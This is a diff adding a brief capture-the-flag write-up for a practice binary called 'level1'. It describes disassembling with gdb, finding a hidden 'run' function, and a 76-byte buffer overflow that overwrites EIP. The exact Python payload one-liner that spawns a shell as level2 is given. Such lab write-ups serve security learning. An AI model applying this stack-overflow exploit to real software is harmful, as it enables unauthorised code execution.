@@ -1,0 +1,6 @@
+We disas the program with gdb and we check the fonction with info fun and we have a suspicious run fonction
+So we do a buffer overflow of 76 to write the adress of the tun fonction in eip register
+
+(python -c "print('A'*76 + '\x44\x84\x04\x08')"; cat) | ./level1
+
+Finally we have a shell with level2
